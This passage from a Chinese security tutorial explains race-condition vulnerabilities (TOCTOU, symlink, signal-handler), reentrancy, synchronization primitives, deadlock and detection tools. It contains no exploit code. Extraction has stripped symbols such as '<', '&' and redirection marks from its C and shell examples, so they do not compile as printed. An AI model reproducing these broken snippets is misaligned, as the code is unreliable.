cd\u4e5f\u662f\u591a\u6837\u7684\uff0c\u8f7b\u5219\u7a0b\u5e8f\u5f02\u5e38\u6267\u884c\uff0c\u91cd\u5219\u7a0b\u5e8f\u5d29\u6e83\u3002\u5982\u679c\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u88ab\u653b\u51fb\u8005\u5229\u7528\u7684\u8bdd\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u4f7f\u5f97\u653b\u51fb\u8005\u83b7\u5f97\u76f8\u5e94\u7cfb\u7edf\u7684\u7279\u6743\u3002\n\n\n\u8fd9\u91cc\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002\n\n\n#include\n \npthread.h\n\n\n#include\n \nstdio.h\n\n\n\nint\n \ncounter\n;\n\n\nvoid\n \n*\nIncreaseCounter\n(\nvoid\n \n*\nargs\n)\n \n{\n\n  \ncounter\n \n+=\n \n1\n;\n\n  \nsleep\n(\n0.1\n);\n\n  \nprintf\n(\nThread %d has counter value %d\n\\n\n,\n \n(\nunsigned\n \nint\n)\npthread_self\n(),\n\n         \ncounter\n);\n\n\n}\n\n\n\nint\n \nmain\n()\n \n{\n\n  \npthread_t\n \np\n[\n10\n];\n\n  \nfor\n \n(\nint\n \ni\n \n=\n \n0\n;\n \ni\n \n \n10\n;\n \n++\ni\n)\n \n{\n\n    \npthread_create\n(\np\n[\ni\n],\n \nNULL\n,\n \nIncreaseCounter\n,\n \nNULL\n);\n\n  \n}\n\n  \nfor\n \n(\nint\n \ni\n \n=\n \n0\n;\n \ni\n \n \n10\n;\n \n++\ni\n)\n \n{\n\n    \npthread_join\n(\np\n[\ni\n],\n \nNULL\n);\n\n  \n}\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u6309\u5982\u4e0b\u65b9\u5f0f\u8f93\u51fa\n\n\n\u279c  005race_condition ./example1\nThread \n1859024640\n has counter value \n1\n\nThread \n1841583872\n has counter value \n2\n\nThread \n1832863488\n has counter value \n3\n\nThread \n1824143104\n has counter value \n4\n\nThread \n1744828160\n has counter value \n5\n\nThread \n1736107776\n has counter value \n6\n\nThread \n1727387392\n has counter value \n7\n\nThread \n1850304256\n has counter value \n8\n\nThread \n1709946624\n has counter value \n9\n\nThread \n1718667008\n has counter value \n10\n\n\n\n\n\n\u4f46\u662f\uff0c\u7531\u4e8e\u6761\u4ef6\u7ade\u4e89\u7684\u5b58\u5728\uff0c\u6700\u540e\u8f93\u51fa\u7684\u7ed3\u679c\u5f80\u5f80\u4e0d\u5c3d\u4eba\u610f\n\n\n\u279c\n  \n005\nrace_condition\n \n.\n/\nexample1\n                          \n\nThread\n \n1417475840\n \nhas\n \ncounter\n \nvalue\n \n2\n\n\nThread\n \n1408755456\n \nhas\n \ncounter\n \nvalue\n \n2\n\n\nThread\n \n1391314688\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1356433152\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1365153536\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1373873920\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1382594304\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1400035072\n \nhas\n \ncounter\n \nvalue\n \n8\n\n\nThread\n \n1275066112\n \nhas\n \ncounter\n \nvalue\n \n9\n\n\nThread\n \n1266345728\n \nhas\n \ncounter\n \nvalue\n \n10\n\n\n\n\n\n\u4ed4\u7ec6\u601d\u8003\u4e00\u4e0b\u6761\u4ef6\u7ade\u4e89\u4e3a\u4ec0\u4e48\u53ef\u80fd\u4f1a\u53d1\u751f\u5462\uff1f\u4ee5\u4e0b\u9762\u7684\u4e3a\u5177\u4f53\u7684\u4f8b\u5b50\n\n\n\n\n\u7a0b\u5e8f\u9996\u5148\u6267\u884c\u4e86action1\uff0c\u7136\u540e\u6267\u884c\u4e86action2\u3002\u5176\u4e2d action \u53ef\u80fd\u662f\u5e94\u7528\u7ea7\u522b\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u522b\u7684\u3002\u6b63\u5e38\u6765\u8bf4\uff0c\u6211\u4eec\u5e0c\u671b\u7a0b\u5e8f\u5728\u6267\u884c action2 \u65f6\uff0caction1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u4ecd\u7136\u662f\u6ee1\u8db3\u7684\u3002\n\n\n\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u7684\u5e76\u53d1\u6027\uff0c\u653b\u51fb\u8005\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u5728 action2 \u6267\u884c\u4e4b\u524d\u7684\u8fd9\u4e2a\u77ed\u6682\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u7834\u574f action1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u3002\u8fd9\u65f6\u5019\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u4e0e action2 \u4ea7\u751f\u4e86\u6761\u4ef6\u7ade\u4e89\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u679c\u3002\n\n\n\n\n\n\n\u6240\u4ee5\u6211\u8ba4\u4e3a\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u7a0b\u5e8f\u5458\u867d\u7136\u5047\u8bbe\u67d0\u4e2a\u6761\u4ef6\u5728\u76f8\u5e94\u65f6\u95f4\u6bb5\u5e94\u8be5\u662f\u6ee1\u8db3\u7684\uff0c\u4f46\u662f\u5f80\u5f80\u6761\u4ef6\u53ef\u80fd\u4f1a\u5728\u8fd9\u4e2a\u5f88\u5c0f\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u88ab\u4fee\u6539\u3002\n\u867d\u7136\u8fd9\u4e2a\u65f6\u95f4\u7684\u95f4\u9694\u53ef\u80fd\u975e\u5e38\u5c0f\uff0c\u4f46\u662f\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff08\u5982\u8ba1\u7b97\u5bc6\u96c6\u578b\u64cd\u4f5c\uff0cDos\u653b\u51fb\uff09\u4f7f\u5f97\u53d7\u5bb3\u673a\u5668\u7684\u5904\u7406\u901f\u5ea6\u53d8\u5f97\u76f8\u5bf9\u6162\u4e00\u4e9b\u3002\n\n\n\u5f62\u5f0f\n\n\n\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u6709\u4ee5\u4e0b\u5f62\u5f0f\u3002\n\n\nCWE-367: TOCTOU Race Condition\n\n\n\u63cf\u8ff0\n\n\nTOCTOC (Time-of-check Time-of-use) \u6307\u7684\u662f\u7a0b\u5e8f\u5728\u4f7f\u7528\u8d44\u6e90\uff08\u53d8\u91cf\uff0c\u5185\u5b58\uff0c\u6587\u4ef6\uff09\u524d\u4f1a\u5bf9\u8fdb\u884c\u68c0\u67e5\uff0c\u4f46\u662f\u5728\u7a0b\u5e8f\u4f7f\u7528\u5bf9\u5e94\u7684\u8d44\u6e90\u524d\uff0c\u8be5\u8d44\u6e90\u5374\u88ab\u4fee\u6539\u4e86\u3002\n\n\n\n\n\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e9b\u66f4\u52a0\u5177\u4f53\u7684\u4f8b\u5b50\u3002\n\n\nCWE-365: Race Condition in Switch\n\n\n\u5f53\u7a0b\u5e8f\u6b63\u5728\u6267\u884c switch \u8bed\u53e5\u65f6\uff0c\u5982\u679c switch \u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u9020\u6210\u4e0d\u53ef\u9884\u77e5\u7684\u884c\u4e3a\u3002\u5c24\u5176\u5728case \u8bed\u53e5\u540e\u4e0d\u5199 break \u8bed\u53e5\u7684\u4ee3\u7801\uff0c\u4e00\u65e6 switch \u53d8\u91cf\u53d1\u751f\u6539\u53d8\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u6539\u53d8\u7a0b\u5e8f\u539f\u6709\u7684\u903b\u8f91\u3002\n\n\nCWE-363: Race Condition Enabling Link Following\n\n\n\u6211\u4eec\u77e5\u9053 Linux \u4e2d\u63d0\u4f9b\u4e86\u4e24\u79cd\u5bf9\u4e8e\u6587\u4ef6\u7684\u547d\u540d\u65b9\u5f0f\n\n\n\n\n\u6587\u4ef6\u8def\u5f84\u540d\n\n\n\u6587\u4ef6\u63cf\u8ff0\u7b26\n\n\n\n\n\u4f46\u662f\uff0c\u5c06\u8fd9\u4e24\u79cd\u547d\u540d\u89e3\u6790\u5230\u76f8\u5e94\u5bf9\u8c61\u4e0a\u7684\u65b9\u5f0f\u6709\u6240\u4e0d\u540c\n\n\n\n\n\u6587\u4ef6\u8def\u5f84\u540d\u5728\u89e3\u6790\u7684\u65f6\u5019\u662f\u901a\u8fc7\u4f20\u5165\u7684\u8def\u5f84\uff08\u6587\u4ef6\u540d\uff0c\u786c\u94fe\u63a5\uff0c\u8f6f\u8fde\u63a5\uff09\n\u95f4\u63a5\u89e3\u6790\n\u7684\uff0c\u5176\u4f20\u5165\u7684\u53c2\u6570\u5e76\u4e0d\u662f\u76f8\u5e94\u6587\u4ef6\u7684\u771f\u5b9e\u5730\u5740(inode)\u3002\n\n\n\u6587\u4ef6\u63cf\u8ff0\u7b26\u901a\u8fc7\u8bbf\u95ee\u76f4\u63a5\u6307\u5411\u6587\u4ef6\u7684\u6307\u9488\u6765\u89e3\u6790\u3002\n\n\n\n\n\u6b63\u662f\u7531\u4e8e\u95f4\u63a5\u6027\uff0c\u4ea7\u751f\u4e86\u4e0a\u9762\u6211\u4eec\u6240\u8bf4\u7684\u65f6\u95f4\u7a97\u53e3\u3002\n\n\n\u4ee5\u4e0b\u9762\u7684\u4ee3\u7801\u4e3a\u4f8b\u5b50\uff0c\u7a0b\u5e8f\u5728\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u4e4b\u524d\uff0c\u4f1a\u68c0\u67e5\u662f\u5426\u5b58\u5728\uff0c\u4e4b\u540e\u4f1a\u6253\u5f00\u6587\u4ef6\u7136\u540e\u6267\u884c\u64cd\u4f5c\u3002\u4f46\u662f\u5982\u679c\u5728\u68c0\u67e5\u4e4b\u540e\uff0c\u771f\u6b63\u4f7f\u7528\u6587\u4ef6\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5c06\u6587\u4ef6\u4fee\u6539\u4e3a\u67d0\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c06\u8bbf\u95ee\u9519\u8bef\u7684\u6587\u4ef6\u3002\n\n\n\n\n\u8fd9\u79cd\u6761\u4ef6\u7ade\u4e89\u51fa\u73b0\u7684\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u540d\u5b57\u5bf9\u8c61\u7ed1\u5b9a\u7684\u95ee\u9898\u3002\u800c\u4e0b\u9762\u7684\u51fd\u6570\u90fd\u4f1a\u4f7f\u7528\u6587\u4ef6\u540d\u4f5c\u4e3a\u53c2\u6570\uff1aaccess(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename(), chroot(),\u2026\n\n\n\u90a3\u8be5\u5982\u4f55\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fstat \u51fd\u6570\u6765\u8bfb\u53d6\u6587\u4ef6\u7684\u4fe1\u606f\u5e76\u628a\u5b83\u5b58\u5165\u5230stat\u7ed3\u6784\u4f53\u4e2d\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u4fe1\u606f\u4e0e\u6211\u4eec\u5df2\u77e5\u7684\u4fe1\u606f\u8fdb\u884c\u6bd4\u8f83\u6765\u5224\u65ad\u6211\u4eec\u662f\u5426\u8bfb\u5165\u4e86\u6b63\u786e\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cstat\u7ed3\u6784\u4f53\u4e2d\u7684 \nst_ino\n \u548c \nst_dev\n \u53d8\u91cf\u53ef\u4ee5\u552f\u4e00\u8868\u793a\u6587\u4ef6\n\n\n\n\nst_ino\n \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u7684\u5e8f\u5217\u53f7\uff0c\u5373 \ni-node\n\n\nst_dev\n \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u5bf9\u5e94\u7684\u8bbe\u5907\u3002\n\n\n\n\n\n\nCWE-364: Signal Handler Race Condition\n\n\n\u6982\u8ff0\n\n\n\u6761\u4ef6\u7ade\u4e89\u7ecf\u5e38\u4f1a\u53d1\u751f\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u8fd9\u662f\u56e0\u4e3a\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u652f\u6301\u5f02\u6b65\u64cd\u4f5c\u3002\u5c24\u5176\u662f\u5f53\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u662f\n\u4e0d\u53ef\u91cd\u5165\n\u7684\u6216\u8005\u72b6\u6001\u654f\u611f\u7684\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u5229\u7528\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u7684\u6761\u4ef6\u7ade\u4e89\uff0c\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u548c\u4ee3\u7801\u6267\u884c\u7684\u6548\u679c\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u6267\u884c\u4e86free\u64cd\u4f5c\uff0c\u6b64\u65f6\u53c8\u6765\u4e86\u4e00\u4e2a\u4fe1\u53f7\uff0c\u7136\u540e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u5c31\u4f1a\u518d\u6b21\u6267\u884cfree\u64cd\u4f5c\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0 double free \u7684\u60c5\u51b5\uff0c\u518d\u7a0d\u5fae\u64cd\u4f5c\u4e00\u4e0b\uff0c\u5c31\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u4e86\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u6709\u5173\u7684\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u60c5\u51b5\u6709\n\n\n\n\n\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u548c\u666e\u901a\u7684\u4ee3\u7801\u6bb5\u5171\u4eab\u5168\u5c40\u53d8\u91cf\u548c\u6570\u636e\u6bb5\u3002\n\n\n\u5728\u4e0d\u540c\u7684\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u5171\u4eab\u72b6\u6001\u3002\n\n\n\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u672c\u8eab\u4f7f\u7528\u4e0d\u53ef\u91cd\u5165\u7684\u51fd\u6570\uff0c\u6bd4\u5982 malloc \u548c free \u3002\n\n\n\u4e00\u4e2a\u4fe1\u53f7\u5904\u7406\u51fd\u6570\u5904\u7406\u591a\u4e2a\u4fe1\u53f7\uff0c\u8fd9\u53ef\u80fd\u4f1a\u8fdb\u800c\u5bfc\u81f4use after free \u548c double free \u6f0f\u6d1e\u3002\n\n\n\u4f7f\u7528 setjmp \u6216\u8005 longjmp \u7b49\u673a\u5236\u6765\u4f7f\u5f97\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e0d\u80fd\u591f\u8fd4\u56de\u539f\u6765\u7684\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\n\n\n\n\n\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165\n\n\n\u8fd9\u91cc\u8bf4\u660e\u4e00\u4e0b\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165\u7684\u5173\u7cfb\u3002\n\n\n\n\n\u7ebf\u7a0b\u5b89\u5168\n\n\n\u5373\u8be5\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u7ebf\u7a0b\u8c03\u7528\uff0c\u800c\u4e0d\u4f1a\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\u3002\n\n\n\u6761\u4ef6\n\n\n\u672c\u8eab\u6ca1\u6709\u4efb\u4f55\u5171\u4eab\u8d44\u6e90\n\n\n\u6709\u5171\u4eab\u8d44\u6e90\uff0c\u9700\u8981\u52a0\u9501\u3002\n\n\n\n\n\n\n\n\n\n\n\u53ef\u91cd\u7528\n\n\n\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u5b9e\u4f8b\u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u5728\u76f8\u540c\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u3002\n\n\n\u53ef\u91cd\u5165\u51fd\u6570\u53ef\u4ee5\u88ab\u4e2d\u65ad\uff0c\u5e76\u4e14\u5176\u5b83\u4ee3\u7801\u5728\u8fdb\u5165\u8be5\u51fd\u6570\u65f6\uff0c\u4e0d\u4f1a\u4e22\u5931\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002\u6240\u4ee5\u53ef\u91cd\u5165\u51fd\u6570\u4e00\u5b9a\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\u3002\n\n\n\u53ef\u91cd\u5165\u5f3a\u8c03\u7684\u662f\u5355\u4e2a\u7ebf\u7a0b\u6267\u884c\u65f6\uff0c\u91cd\u65b0\u8fdb\u5165\u540c\u4e00\u4e2a\u5b50\u7a0b\u5e8f\u4ecd\u7136\u662f\u5b89\u5168\u7684\u3002\n\n\n\u4e0d\u6ee1\u8db3\u6761\u4ef6\n\n\n\u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86\u9759\u6001\u6570\u636e\u7ed3\u6784\uff0c\u5e76\u4e14\u4e0d\u662f\u5e38\u91cf\n\n\n\u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86malloc \u6216\u8005 free \u51fd\u6570\n\n\n\u51fd\u6570\u4f7f\u7528\u4e86\u6807\u51c6 IO \u51fd\u6570\u3002\n\n\n\u8c03\u7528\u7684\u51fd\u6570\u4e0d\u662f\u53ef\u91cd\u5165\u7684\u3002\n\n\n\n\n\n\n\u53ef\u91cd\u5165\u51fd\u6570\u4f7f\u7528\u7684\u6240\u6709\u53d8\u91cf\u90fd\u4fdd\u5b58\u5728\n\u8c03\u7528\u6808\n\u7684\u5f53\u524d\n\u51fd\u6570\u6808\n\uff08frame\uff09\u4e0a\u3002\n\n\n\n\n\n\n\n\n\u9632\u8303\n\n\n\u5982\u679c\u60f3\u8981\u6d88\u9664\u6761\u4ef6\u7ade\u4e89\uff0c\u90a3\u4e48\u9996\u8981\u7684\u76ee\u6807\u662f\u627e\u5230\u7ade\u4e89\u7a97\u53e3\uff08race windows\uff09\u3002\n\n\n\u6240\u8c13\u7ade\u4e89\u7a97\u53e3\uff0c\u5c31\u662f\u8bbf\u95ee\u7ade\u4e89\u5bf9\u8c61\u7684\u4ee3\u7801\u6bb5\uff0c\u8fd9\u7ed9\u653b\u51fb\u8005\u76f8\u5e94\u7684\u673a\u4f1a\u6765\u4fee\u6539\u76f8\u5e94\u7684\u7ade\u4e89\u5bf9\u8c61\u3002\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97\u51b2\u7a81\u7684\u7ade\u4e89\u7a97\u53e3\u76f8\u4e92\u6392\u65a5\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002\n\n\n\u540c\u6b65\u539f\u8bed\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u540c\u6b65\u539f\u8bed\u6765\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002\u5e38\u89c1\u7684\u5982\u4e0b\n\n\n\n\n\u9501\u53d8\u91cf\n\n\n\u901a\u5e38\u4e92\u65a5\u7410\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u653e\u5f03CPU\uff0c\u8fdb\u5165idle\u72b6\u6001\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u81ea\u52a8\u5c1d\u8bd5\u3002\n\n\n\u81ea\u65cb\u9501\uff08spinlock\uff09\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u4e0d\u653e\u5f03CPU\uff0c\u4e00\u76f4\u5c1d\u8bd5\u3002\n\n\n\n\n\n\n\u6761\u4ef6\u53d8\u91cf\n\n\n\u6761\u4ef6\u53d8\u91cf\u662f\u7528\u6765\u7b49\u5f85\u800c\u4e0d\u662f\u7528\u6765\u4e0a\u9501\u7684\u3002\u6761\u4ef6\u53d8\u91cf\u7528\u6765\u81ea\u52a8\u963b\u585e\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u76f4\u5230\u67d0\u7279\u6b8a\u60c5\u51b5\u53d1\u751f\u4e3a\u6b62\u3002\u901a\u5e38\u6761\u4ef6\u53d8\u91cf\u548c\u4e92\u65a5\u9501\u540c\u65f6\u4f7f\u7528\u3002\n\n\n\n\n\n\n\n\n\u4e34\u754c\u533a\u5bf9\u8c61\uff0cCRITICAL_SECTION\n\n\n\n\n\n\n\u4fe1\u53f7\u91cf\uff08semaphore\uff09\uff0c\u63a7\u5236\u53ef\u8bbf\u95ee\u67d0\u4e2a\u4e34\u754c\u533a\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u4e00\u822c\u6bd41\u5927\u3002\n\n\n\n\n\u7ba1\u9053\uff0c\u6307\u7528\u4e8e\u8fde\u63a5\u4e00\u4e2a\u8bfb\u8fdb\u7a0b\u548c\u4e00\u4e2a\u5199\u8fdb\u7a0b\u4ee5\u5b9e\u73b0\u5b83\u4eec\u4e4b\u95f4\u901a\u4fe1\u7684\u4e00\u4e2a\u5171\u4eab\u6587\u4ef6\u3002\u5176\u751f\u5b58\u671f\u4e0d\u8d85\u8fc7\u521b\u5efa\u7ba1\u9053\u7684\u8fdb\u7a0b\u7684\u751f\u5b58\u671f\u3002\n\n\n\u547d\u540d\u7ba1\u9053\uff0c\u751f\u5b58\u671f\u53ef\u4ee5\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u671f\u4e00\u6837\u957f\u3002\n\n\n\n\n# \u521b\u5efa\u7ba1\u9053\nmkfifo my_pipe\n# gzip\u4ece\u7ed9\u5b9a\u7684\u7ba1\u9053\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u5e76\u628a\u6570\u636e\u538b\u7f29\u5230out.gz\u4e2d\ngzip -9 -c \n my_pipe \n out.gz \n\n# \u7ed9\u7ba1\u9053\u4f20\u8f93\u6570\u636e\ncat file \n my_pipe\n\n\n\n\n\u6b7b\u9501\n\n\n\u6982\u8ff0\n\n\n\u5f53\u540c\u6b65\u539f\u8bed\u4f7f\u7528\u7684\u4e0d\u6070\u5f53\u7684\u65f6\u5019\uff0c\u8fdb\u7a0b\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6b7b\u9501\u3002\u5f53\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u6267\u884c\u6d41\u4e92\u76f8\u963b\u585e\u5bfc\u81f4\u90fd\u4e0d\u80fd\u7ee7\u7eed\u6267\u884c\uff0c\u6b7b\u9501\u5c31\u4f1a\u53d1\u751f\u3002\u5176\u5b9e\uff0c\u6b7b\u9501\u4e3b\u8981\u662f\u56e0\u4e3a\u5728\u51b2\u7a81\u7684\u6267\u884c\u6d41\u4e2d\uff0c\u51fa\u73b0\u4e86\u5faa\u73af\u7b49\u5f85\u7684\u6267\u884c\u6d41\uff0c\u5373\u5faa\u73af\u7b49\u5f85\u4e2d\u7684\u6bcf\u4e00\u4e2a\u6267\u884c\u6d41\u90fd\u83b7\u5f97\u4e00\u4e2a\u8d44\u6e90\uff0c\u540c\u65f6\u8bd5\u56fe\u83b7\u5f97\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002\u4e0b\u56fe\u6240\u793a\uff0cP1\u3001P2 \u4e24\u4e2a\u8fdb\u7a0b\u90fd\u9700\u8981\u8d44\u6e90\u624d\u80fd\u7ee7\u7eed\u8fd0\u884c\u3002P1 \u62e5\u6709\u8d44\u6e90 R2\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R1 \u624d\u80fd\u8fd0\u884c\uff1bP2 \u62e5\u6709\u8d44\u6e90 R1\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R2 \u624d\u80fd\u8fd0\u884c\uff0c\u4e24\u8fb9\u90fd\u5728\u4e92\u76f8\u7b49\u5f85\u800c\u6ca1\u6709\u4efb\u4f55\u4e00\u4e2a\u53ef\u8fd0\u884c\u3002\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u6b7b\u9501\u6709\u4ee5\u4e0b\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6\n\n\n\n\n\u4e92\u65a5\uff0c\u8d44\u6e90\u662f\u4e92\u65a5\u7684\u3002\n\n\n\u6301\u6709\u548c\u7b49\u5f85\uff0c\u6301\u6709\u5df2\u6709\u7684\u8d44\u6e90\uff0c\u540c\u65f6\u7b49\u5f85\u4f7f\u7528\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002\n\n\n\u4e0d\u53ef\u62a2\u5360\uff0c\u8fdb\u7a0b\u6240\u83b7\u5f97\u7684\u8d44\u6e90\u5728\u672a\u4f7f\u7528\u5b8c\u6bd5\u4e4b\u524d\uff0c\u8d44\u6e90\u7533\u8bf7\u8005\u4e0d\u80fd\u5f3a\u884c\u5730\u4ece\u8d44\u6e90\u5360\u6709\u8005\u624b\u4e2d\u593a\u53d6\u8d44\u6e90\uff0c\u800c\u53ea\u80fd\u7531\u8be5\u8d44\u6e90\u7684\u5360\u6709\u8005\u8fdb\u7a0b\u81ea\u884c\u91ca\u653e\u3002\n\n\n\u5faa\u73af\u7b49\u5f85\uff0c\u5faa\u73af\u7b49\u5f85\u8d44\u6e90\u3002\n\n\n\n\n\u800c\u5982\u679c\u60f3\u8981\u6d88\u9664\u6b7b\u9501\uff0c\u4e5f\u5c31\u662f\u6253\u7834\u4e0a\u9762\u7684\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6\u3002\n\n\n\u6b64\u5916\uff0c\u6b7b\u9501\u53ef\u80fd\u6765\u6e90\u4e8e\u4ee5\u4e0b\u7684\u539f\u56e0\n\n\n\n\n\u5904\u7406\u5668\u901f\u5ea6\n\n\n\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u8c03\u5ea6\u7b97\u6cd5\u7684\u53d8\u52a8\n\n\n\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u540c\u5185\u5b58\u7684\u9650\u5236\u3002\n\n\n\u4efb\u4f55\u80fd\u591f\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\u7684\u5f02\u6b65\u4e8b\u4ef6\u3002\n\n\n\n\n\u5f71\u54cd\n\n\n\u6b7b\u9501\u4e00\u822c\u60c5\u51b5\u4e0b\u4f1a\u9020\u6210\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002\n\n\n\u68c0\u6d4b\n\n\n\u90a3\u4e48\uff0c\u8bf4\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u68c0\u6d4b\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u5462\uff1f\u76ee\u524d\u4e5f\u786e\u5b9e\u6709\u8fd9\u65b9\u9762\u7684\u7814\u7a76\uff0c\u4e5f\u662f\u4e3b\u8981\u4ece\u9759\u6001\u5206\u6790\u548c\u52a8\u6001\u5206\u6790\u4e24\u4e2a\u65b9\u9762\u6765\u68c0\u6d4b\u3002\n\n\n\u9759\u6001\u68c0\u6d4b\n\n\n\u76ee\u524d\u5df2\u77e5\u7684\u9759\u6001\u68c0\u6d4b\u5de5\u5177\u6709\n\n\n\n\nFlawfinder\n\n\n\u76ee\u6807\uff1aC/C++\u6e90\u7801\n\n\n\u6b65\u9aa4\n\n\n\u5efa\u7acb\u6f0f\u6d1e\u6570\u636e\u5e93\n\n\n\u8fdb\u884c\u7b80\u5355\u7684\u6587\u672c\u6a21\u5f0f\u5339\u914d\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u6570\u636e\u6d41\u6216\u63a7\u5236\u6d41\u5206\u6790\n\n\n\n\n\n\n\n\n\n\nThreadSanitizer\n\n\n\u76ee\u6807\uff1aC++\u548cGO\n\n\n\u5b9e\u73b0\uff1aLLVM\n\n\n\n\n\n\n\n\n\u52a8\u6001\u68c0\u6d4b\n\n\n\n\nIntel 